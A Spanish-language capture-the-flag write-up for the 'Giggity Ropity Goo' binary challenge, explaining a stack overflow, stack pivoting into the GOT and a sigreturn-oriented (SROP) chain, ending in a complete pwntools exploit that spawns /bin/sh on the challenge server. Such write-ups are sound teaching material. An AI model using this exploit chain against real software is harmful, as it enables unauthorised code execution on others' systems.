# Giggity Ropity Goo

## Introducion

El programa lee 0x110 bytes de un buffer de 0x100, no tiene PIE ni stack canary:
```
 checksec main
[*] '/home/kalcast/Descargas/Giggity_Ropity_Goo/main'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

Puesto que 0x100 bytes de offset y 0x8 para el RBP almacenado solo nos deja espacio para un byte tenemos que hacer stack pivoting:
```
pwndbg> disass
Dump of assembler code for function main:
   0x0000000000401183 <+0>:     push   rbp
   0x0000000000401184 <+1>:     mov    rbp,rsp
=> 0x0000000000401187 <+4>:     sub    rsp,0x100
   0x000000000040118e <+11>:    mov    eax,0x0
   0x0000000000401193 <+16>:    call   0x401146 <setup>
   0x0000000000401198 <+21>:    mov    edi,0x3c
   0x000000000040119d <+26>:    call   0x401040 <alarm@plt>
   0x00000000004011a2 <+31>:    lea    rax,[rbp-0x100]
   0x00000000004011a9 <+38>:    mov    edx,0x110
   0x00000000004011ae <+43>:    mov    rsi,rax
   0x00000000004011b1 <+46>:    mov    edi,0x0
   0x00000000004011b6 <+51>:    call   0x401050 <read@plt>
   0x00000000004011bb <+56>:    mov    eax,0x0
   0x00000000004011c0 <+61>:    leave
   0x00000000004011c1 <+62>:    ret
End of assembler dump.
pwndbg>
```

Si retornamos a main+31 (0x00000000004011a2) tenemos otra entrada y puesto que el buffer(rsi) depende de rax y rax depende de rbp podemos escribir en rbp-0x100 nuestro nuevo stack y en rbp nuestro proximo gadget.

Si buscamos gadgets con ROPgadget encontramos una syscall:
```
ROPgadget --binary main | grep syscall
0x000000000040117c : syscall
```

Tenemos:
- Un buffer relativamente grande
- Una forma de controlar RAX
- Una syscall

Se cumplen las condiciones para hacer SROP.

## SROP (Signal Return Oriented Programming)

Siendo breve la syscall `rt_sigreturn`(0xf) es usada por el kernel del SO para reestablecer el estado de un programa despues de haberlo detenido.

Una vez se ejecuta se restaura un "Sigreturn Frame", que es un buffer de 0xf8(248) bytes desde donde apunta RSP.

<img width="691" height="672" alt="srop-example-1" src="https://github.com/user-attachments/assets/2613fc8d-51e2-473b-bff5-ec912d3deb8a" />

Este frame contiene todos los registros incluyendo `RIP`. Podemos redirigir la ejecucion hacia la syscall con rax=59, rdi=addr("/bin/sh\x00") y rsi=rdx=0 para llamar a `execve("/bin/sh",NULL,NULL)`

## Exploit

La idea aqui fue almacenar a partir de  RBP con el valor de `rt_sigreturn` + 0x100(RAX=RBP-0X100) en read@GOT+0x100, seguido del RSP (gadget de read) y el SigreturnFrame.

Luego se sobreescribe read@GOT con la direccion de la syscall y read@GOT+8 con "/bin/sh\x00".

```
*** segundo read ***

rbp = gotread + 0x100 + 0x100
rsp = stack_addr

buffer = gotread + 0x100
----------------------------------------
rt_sigreturn + 0x100     (gotread + 0x100)
read_gadget              (gotread + 0x108)
sigreturn_frame[8:0xf8]  (gotread + 0x110)
gotread + 0x100          (gotread + 0x200)
read_gadget              (gotread + 0x208)
----------------------------------------

*** tercer read ***

rbp = gotread + 0x100
rsp = read_gadget

buffer
----------------------------------------
syscall                  (gotread)
"/bin/sh"                (gotread + 0x8)
----------------------------------------

rbp = rt_sigreturn + 0x100
rsp = read_gadget

last gadget
------------------
rax = rt_sigreturn
edx = 0x100
rsi = rt_sigreturn
rdi = 0

syscall(rax) = syscall(sigreturn)
rip = syscall
rdi = gotread + 8

# Se recupera el Sigreturn Frame y se ejecuta execve("/bin/sh\x00",NULL,NULL)
```

```py
#!/usr/bin/env python3
from pwn import *

elf = ELF("./main")
#libc = ELF("./")
#ld = ELF("./")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
'''

domain= "chal.wwctf.com"
port = 7003

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])
r = start()

#========= exploit here ===================

log.info("Preparing Pivoting to .bss & Fake Frame")
syscall = 0x000000000040117c
payload = flat({0x100:[elf.got["read"] + 0x100 + 0x100, elf.sym["main"] + 31]}, filler=b"A")
r.send(payload)

frame = SigreturnFrame()
frame.rax = 59                              # syscall number for execve()
frame.rdi = elf.got["read"] + 0x8           # pointer to "/bin/sh" 
frame.rsi = 0                               # NULL
frame.rdx = 0                               # NULL
frame.rip = syscall                         # syscall address
frame.uc_flags = syscall
frame.csgsfs = (0x002b * 0x1000000000000) | (0x0000 * 0x100000000) | (0x0000 * 0x10000) | (0x0033 * 0x1)
frame = bytes(frame)

log.info("Frame length: %#x", len(frame))

log.info("Sending Fake Frame and preparing GOT read RIP")
# RBP(rt_sigreturn + 0x100) + RIP
payload2 = flat({0:[0x100 + 0xf, elf.sym["main"]+31, frame[0x8:0xf8]],
                    0x100:[elf.got["read"] + 0x100, elf.sym["main"] + 31]}, filler=b"\x00")
r.send(payload2)

log.info("Overwriting got read to syscall & get shell wi")
# Overwrite read to syscall
r.send(p64(syscall) + p64(u64(b"/bin/sh\x00")))
r.interactive()
```




